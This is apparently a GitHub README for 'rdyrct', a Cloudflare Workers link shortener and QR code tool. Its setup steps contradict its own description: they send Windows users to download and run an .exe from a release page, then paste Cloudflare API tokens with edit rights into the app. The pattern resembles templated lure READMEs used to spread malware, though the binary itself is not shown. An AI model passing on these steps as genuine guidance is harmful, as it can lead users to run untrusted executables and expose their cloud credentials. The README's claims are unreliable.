# 🔗 rdyrct - Create branded links for your team

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/impugnable-reed152/rdyrct/releases)

rdyrct helps teams manage web links. You create branded short links, generate QR codes, and use custom domains. The software runs on Cloudflare Workers. It keeps your link management simple and keeps your data under your control.

## 📦 How to get the software

You need to download the latest version from our website. Follow these steps to get the software on your Windows computer.

1. Visit this page to download the latest release: [https://github.com/impugnable-reed152/rdyrct/releases](https://github.com/impugnable-reed152/rdyrct/releases)
2. Look for the file ending in .exe under the Assets section.
3. Click the file name to save it to your computer.
4. Open your Downloads folder.
5. Double-click the file to start the installation.

## ⚙️ System requirements

Your computer needs the following to run rdyrct:

* Operating System: Windows 10 or Windows 11.
* Memory: 4 gigabytes of RAM or more.
* Storage: 100 megabytes of free space.
* Internet: A stable connection for link creation.

## 🚀 Setting up the application

Follow these steps to configure your account after you install the software.

### Prepare your Cloudflare account
rdyrct works with Cloudflare. You need a free account to manage your links and keep them fast.

1. Go to the Cloudflare website and sign up.
2. Ensure you have access to a domain name.
3. Set up a D1 database in your Cloudflare dashboard. This database stores your link history.
4. Create a Workers KV namespace. This stores your short link mappings.

### Configure the software
Open rdyrct on your desktop. The first window asks for your API tokens.

1. Navigate to your Cloudflare profile.
2. Find the API Tokens section.
3. Create a token with edit permissions for Workers and D1 Databases.
4. Copy the token into the rdyrct settings screen.
5. Enter your domain name in the primary field.
6. Click Save to link your application to your account.

## 💡 Using rdyrct

The interface shows three main areas: Link Creator, QR Generator, and History.

### Create a short link
1. Paste your long website link into the input box.
2. Select your custom domain from the list.
3. Type a suffix for your link, such as "team-update".
4. Click the Create button.
5. Copy the finished link to your clipboard.

### Generate a QR code
1. Select an existing link from your history list.
2. Click the QR Code button.
3. Customize the foreground and background colors if you want.
4. Click Export to save the image as a PNG file.

## 🛠️ Troubleshooting common issues

Most problems relate to network access or account permissions.

* **Authorization errors:** Check if your API token has the correct permissions for D1 and Workers.
* **Link not working:** Ensure your domain records point to Cloudflare. Verify that your Worker is active in the Cloudflare dashboard.
* **App crashes:** Confirm that you have installed the most recent version from the release page. Update your Windows software if errors persist.

## 🔒 Data and security

Your data stays on your Cloudflare account. rdyrct acts as a bridge between your computer and your cloud account. The application does not store your links on local hard drives. This protects your data if your computer suffers hardware failure. Your team members can access the same data if they sign in with the same account credentials.

## 📝 About this project

rdyrct provides a bridge for teams that need branded links without expensive subscriptions. We use open-source standards to ensure your link infrastructure remains reliable. Your Cloudflare setup allows the links to load quickly for users in any location. 

Keywords: cloudflare, cloudflare-workers, d1, d1-database, open-source, qr-code, qrcode, qrcode-generator, url, url-shortener, workers-kv